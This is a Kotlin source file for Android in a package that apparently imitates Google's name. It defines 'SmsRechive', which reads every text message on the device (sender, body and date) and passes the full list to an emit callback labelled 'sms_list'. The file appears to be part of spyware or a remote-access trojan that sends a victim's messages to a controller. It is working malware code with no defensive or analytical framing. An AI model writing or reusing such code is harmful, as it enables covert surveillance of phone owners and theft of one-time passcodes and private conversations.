package com.google.xmodzz

import android.content.Context
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject

object SmsRechive {
    fun sendAllSms(ctx: Context, emit: (JSONObject) -> Unit) {
        val l = JSONArray()
        val c = ctx.contentResolver.query(
            Telephony.Sms.CONTENT_URI, 
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE), 
            null, 
            null, 
            null
        )
        
        c?.use { 
            while (it.moveToNext()) {
                l.put(JSONObject()
                    .put("address", it.getString(0) ?: "")
                    .put("body", it.getString(1) ?: "")
                    .put("date", it.getLong(2))
                )
            } 
        }
        
        emit(JSONObject().put("action", "sms_list").put("data", l))
    }
}
